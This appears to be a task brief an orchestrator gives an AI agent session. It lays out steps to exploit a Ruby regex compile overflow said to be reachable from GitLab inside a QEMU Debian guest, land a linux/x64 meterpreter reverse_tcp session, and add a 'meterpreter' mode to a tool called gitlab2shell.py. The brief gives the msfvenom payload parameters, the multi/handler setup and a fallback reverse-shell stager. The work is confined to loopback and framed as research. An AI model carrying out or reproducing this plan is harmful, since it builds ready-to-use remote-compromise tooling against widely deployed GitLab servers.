# LANE 7 BRIEF - x86_64 Debian QEMU target + meterpreter PoC (gitlab-reachable vulnerable component)

Authoritative ladder below. Rules: loopback ONLY, timeout 20 every
shell-out, ONE heavy thing at a time (free -g first: host has ~8G avail
- stop gitlab-vuln container while the VM runs if needed), commit+push
after every step (prefix 'glab7:'), notes to lanes/glm7/notes.md
(survival-map style, update every ~10 turns), one tool call per turn,
small turns (900s wall). You are a fresh session; prior state:
lanes/glm/notes.md (R7 = fix-diff construct map C1/C2/C3, instrumented
pristine build, ONIG_DEBUG_COMPILE pending).

## Mission
Isolate the vulnerable regex component REACHABLE FROM GITLAB (R7 C-family
constructs compiled by a pristine-lineage ruby), stand up an x86_64
Debian guest in QEMU, and build gitlab2shell meterpreter mode: exploit
the compile overflow in an x86_64 ruby running inside the guest ->
land linux/x64/meterpreter (reverse_tcp to our handler on loopback) ->
meterpreter session = WIN, logged with session id + canary from the
guest. All artifacts committed.

## Environment facts (verified by orchestrator)
- Host aarch64, NO KVM for x86 (qemu-system-x86_64 installing in bg
  proc_799b6286a1e0, TCG = slow, be patient: boot takes minutes).
- QEMU user-net guest reaches host at 10.0.2.2; host-side listener must
  bind 127.0.0.1 and use 'hostfwd' OR run handler with SRVHOST 0.0.0.0
  on tap... SIMPLEST: use user-net hostfwd rule
  -netdev user,hostfwd=tcp:127.0.0.1:4444-:4444 and run listener INSIDE
  guest? NO - listener on HOST: reverse_tcp target address = 10.0.2.2
  (guest->host loopback via SLIRP); host msfd listens 127.0.0.1:4444;
  SLIRP routes 10.0.2.2:4444 to host 127.0.0.1:4444. VERIFY with a
  guest-side curl first (documented SLIRP behavior).
- Debian cloud image (amd64):
  https://cloud.debian.org/images/cloud/trixie/latest/debian-13-generic-amd64.qcow2
  (~700MB, pull in bg). Cloud-init via seed ISO (cloud-image-utils
  installed) to plant user + canary file /CANARY FLAG{debvm:...} (random
  hex) + auto-login or ssh key. -m 4096 -smp 2 max.
- Meterpreter: research the metasploit ecosystem (meterpreter =
  MSF's staged full-featured payload; linux/x64/meterpreter/reverse_tcp
  = stager connects back, multi/handler stages full meterpreter over
  AES-negotiated channel). msfvenom on HOST aarch64: install metasploit
  framework native (quick-install script or apt from
  https://raw.githubusercontent.com/rapid7/metasploit-framework/master/...
  or gem path; aarch64 works - it's ruby). If install fights, fall back
  to a hand-written execve-shellcode stager that spawns /bin/sh ->
  document as 'stage-0 win' and keep meterpreter as goal; payload
  generation for x86_64 works regardless of host arch (msfvenom emits
  x64 elf/raw regardless of msf host arch).

## Ladder
- [ ] 1. Wait for QEMU install (proc id above / which qemu-system-x86_64).
      Pull Debian cloud image (bg, big). Create seed ISO (user, ssh key,
      runcmd planting /CANARY + building ruby 3.3.12 PRISTINE from
      tarball INSIDE guest with -O1 -g, plus gdb + gcc). Boot
      qcow2+seed via qemu systemd user service or nohup script
      scripts/vm-up.sh (commit it). guest ssh: ssh -p 2222 -> hostfwd.
- [ ] 2. Guest brings up: verify uname -m = x86_64, ruby -v pristine
      3.3.12, /CANARY present. Commit scripts/vm-up.sh + guest notes.
- [ ] 3. Reverse R7 C-family on the GUEST ruby: run C2/C3 constructs;
      confirm compile-time overflow behavior with gdb (regs/mem at
      fault). Pick the construct that gives control of the OOB WRITE
      (value+length) - the meterpreter-usable primitive. Document
      primitive: what gets overwritten (adjacent compile-buffer chunk?)
      and how much attacker text lands.
- [ ] 4. From primitive to exec in the GUEST, smallest win first:
      overwrite -> hijack return/handler -> execute a marker (/tmp/win).
      'stage-0 win' commit. (This is the phpbleed-style grind; expect
      iterations; ASAN guest build helps identify the exact corruption
      offsets; ONIG_DEBUG_COMPILE gives program layout.)
- [ ] 5. msfvenom payload: linux/x64/meterpreter/reverse_tcp
      LHOST=10.0.2.2 LPORT=4444 (raw/elf). Handler on host:
      msfconsole multi/handler SRVHOST=127.0.0.1 LPORT=4444 (verify
      SLIRP 10.0.2.2->host:127.0.0.1 with curl from guest first).
      Integrate: exploit execs the stager in guest -> session lands.
      WIN LOG = session-id + 'sysinfo' + 'read /CANARY' through
      meterpreter. If stager-too-big for primitive: staged execve
      reverse-shell first (stage-0), then chainload meterpreter via
      upload; document either path honestly.
- [ ] 6. gitlab2shell.py: add rce --payload meterpreter|shell + --lhost
      --lport wiring the guest exploit path (keep loopback guard:
      127.0.0.1 targets = guest-forwarded ports count as loopback).
      Update HOWTO + BRIEF.md rung 9. Commit pushed = DONE.
- [ ] 7. Notes: what differs on aarch64 (the gitlab container case:
      pointer formats, page sizes, libc) so the GitLab-embedded port is
      scoped honestly. VM teardown = scripts/vm-down.sh; delete qcow2
      when idle (disk), keep builder recipe.

## Meterpreter research pointers (start here, then verify yourself)
- rapid7/metasploit-framework docs: Payloads (linux/x64/meterpreter/
  reverse_tcp), multi/handler, 'stageless' alternative
  linux/x64/meterpreter_reverse_tcp (large - no stage; only if primitive
  can exec a file, which it can once stage-0 works).
- Stager = ~150-300 bytes raw shellcode (execve(connect()) -> MSF
  fetches the stage over the socket. Good fit: small first-stage shellcode
  lands via our overflow, big meterpreter stage comes over network.
- Alternatives for honesty: reverse_tcp shell (small), but Dean asked
  meterpreter specifically - land the stager + handler = meterpreter.

Orchestrator note 07:3xZ: qemu apt install FAILED first try (stale apt lists -> 404 on edk2/ovmf). Retry running proc_8cc1ac0c3fa0 (apt-get update first). If qemu-system-x86_64 still absent when you start, poll that job instead of re-running apt. If ovmf fails again: it is OPTIONAL - Debian cloud image boots fine with legacy BIOS (no -bios flag); skip edk2.

Orchestrator 08:0xZ: image COMPLETE + SHA512-verified OK (70ef6adc... vs official; 438MB is correct for trixie generic-amd64 - the 700MB estimate was wrong; the pull had finished, you were idle). Proceed rung 1 with vm/debian-13.qcow2 as-is. Delete nothing in vm/.
